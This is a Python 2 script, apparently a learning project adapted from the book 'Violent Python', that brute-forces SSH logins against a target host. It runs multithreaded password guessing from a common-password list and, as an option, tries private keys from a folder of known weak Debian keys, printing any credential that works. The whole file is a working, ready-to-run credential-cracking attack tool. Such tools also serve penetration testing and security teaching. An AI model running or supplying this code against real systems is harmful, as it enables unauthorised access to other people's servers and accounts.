#!/usr/bin/python

"""
Author: Yusuf Kassim

This script attempts to brute force targets using a password list against the SSH login.
I am undecided as to extend this to more than one target. 

reference: Violent Python (The code framework was taken from this book)

"""


import paramiko
import optparse
import time
import sys
import os
from threading import *
from colorama import Fore

max_links = 5
lock = BoundedSemaphore(value=max_links)


class SSH_Brute(object):

    def __init__(self):

        self.Exit = False
        self.attempts = 0
        self.directory = "./Weak_Keys"
    
    #Brute force ssh keys if they are weak
    #based on this story: https://github.com/g0tmi1k/debian-ssh

    def keys(self,domain,ports,user,filepath,flag):

        try:
            y = paramiko.SSHClient()
            y.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            paramiko.util.log_to_file("ssh_brute.log")
            y.connect(domain,port=ports,username=user,key_filename=filepath,timeout=2)
            print Fore.GREEN + "[*] Private Key Cracked: " + filepath + Fore.RESET
            self.Exit = True
        except Exception,e:
            if "Error reading SSH protocol banner" in str(e):
                time.sleep(1)
                self.keys(domain,ports,user,filepath,False)
            elif "Unable to connect" in str(e) or "timed out" in str(e):
                self.attempts += 1
                time.sleep(2)
                self.keys(domain,ports,user,filepath,False)
        finally:
            if flag:
                lock.release()

    
    #Brute force ssh credentials

    def connection(self,domain,ports,user,passwd,flag):

        try:
            y = paramiko.SSHClient()
            y.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            paramiko.util.log_to_file("ssh_brute.log")
            y.connect(domain,port=ports,username=user,password=passwd,timeout=2)
            print Fore.GREEN + "[*] Password Cracked: " + passwd + Fore.RESET
            self.Exit = True
        except Exception,e:
            if "Error reading SSH protocol banner" in str(e):
                time.sleep(3)
                self.connection(domain,ports,user,passwd,False)
            elif "Unable to connect" in str(e):
                self.attempts += 1
                time.sleep(3)
                self.connection(domain,ports,user,passwd,False)
        finally:
            if flag:
                lock.release()

    def main(self):

        parser = optparse.OptionParser("usage: %prog" + " --host [hostname] --user [username] --port [default=22] --keys [brute force PKA]")
        parser.add_option("--host",dest="domain",type="string",help="specify hostname")
        parser.add_option("--user",dest="user",type="string",help="specify username")
        parser.add_option("--port",dest="ports",type="int",help="make sure you give a valid port number")
        parser.add_option("--keys",action="store_true",dest="keys",default=False,help="to brute force private keys use --keys")
        (options,args) = parser.parse_args()
        domain = options.domain
        user = options.user
        ports = options.ports
        keys = options.keys
        
        if domain == None or user == None or ports == None:
            parser.error("[!] Please give a valid hostname,username,and port")
       
        if keys == False:
            
            with open('10k-most-common.txt','rb') as fobj:
                words = fobj.read().splitlines()
        
            for passwd in words:

                if self.Exit:
                    sys.exit(0)
                
                if self.attempts > 5:
                    print "[!] Unable to establish connection. Goodbye."
                    sys.exit()

                lock.acquire()

                print "[*] Testing password: %s" % passwd

                ssh = Thread(target=self.connection,args=(domain,ports,user,passwd,True,))
                ssh.start()
        
        else:

            for file_name in os.listdir(self.directory):

                if self.Exit:
                    sys.exit(0)

                if self.attempts > 5:
                    print "[!] Unable to establish a connection. Goobye"
                    sys.exit()

                lock.acquire()

                filepath = os.path.join(self.directory,file_name)

                print "[*] Testing key: %s" % file_name
                
                ssh = Thread(target=self.keys,args=(domain,ports,user,filepath,True,))
                ssh.start()
     

test = SSH_Brute()
test.main()

